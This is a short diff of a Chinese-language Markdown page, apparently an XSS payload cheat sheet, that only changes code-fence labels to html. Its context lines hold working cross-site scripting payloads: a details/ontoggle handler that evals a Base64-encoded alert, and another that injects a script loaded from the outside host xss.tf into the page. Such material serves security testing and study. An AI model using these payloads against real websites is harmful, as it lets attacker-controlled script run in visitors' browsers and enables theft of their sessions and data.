@@ -107,7 +107,7 @@
   ![15](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ugbw6c1gj30uj08ujs6.jpg)
   
   其他：
-  ```
+  ```html
   Base64编码：
   <details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
   url编码： 
@@ -120,7 +120,7 @@
   
   ```
   引用外部url，运用基于DOM的方法创建和插入节点把外部JS文件注入到网页。
-  ```javascript
+  ```html
   <details open ontoggle=eval("appendChild(createElement('script')).src='http://xss.tf/eeW'") >
   ```
  ![16](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uh5hp1a8j30uj0b1jsy.jpg)
